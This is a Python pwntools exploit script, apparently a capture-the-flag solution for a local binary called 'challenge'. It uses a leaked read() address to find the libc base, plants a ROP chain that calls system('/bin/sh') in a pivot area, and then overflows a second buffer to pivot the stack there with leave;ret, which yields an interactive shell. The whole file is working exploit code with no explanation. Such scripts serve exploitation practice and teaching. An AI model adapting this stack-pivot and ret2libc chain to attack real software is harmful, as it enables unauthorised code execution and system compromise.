from pwn import *

elf = ELF("./challenge")
libc = ELF("./libc.so.6")
rop = ROP(elf)

context.log_level = 'debug'

gs = '''

'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

p = start()
p.recvuntil(b"read leak = ")
base = int(p.recv(14), 16) - libc.symbols['read']
log.info(f"[*]base = {hex(base)}")

pivot_area = elf.symbols['pivot_area']
pivot_stack = pivot_area + 0x700

stage1 = b"A"*0x700
stage1 += p64(0)
stage1 += p64(rop.find_gadget(['ret']).address)
stage1 += p64(rop.find_gadget(['pop rdi', 'ret']).address)
stage1 += p64(next(libc.search(b"/bin/sh\x00")) + base)
stage1 += p64(libc.symbols['system'] + base)
stage1 += p64(rop.find_gadget(['pop rdi', 'ret']).address)
stage1 += p64(0)
stage1 += p64(libc.symbols['exit'] + base)
stage1 += b"B"*0xC0

p.sendafter(b"send rop data:\n", stage1)

stage2 = b"A"*32
stage2 += p64(pivot_stack)
stage2 += p64(rop.find_gadget(['leave', 'ret']).address)

p.sendafter(b"send pivot:\n", stage2)

p.interactive()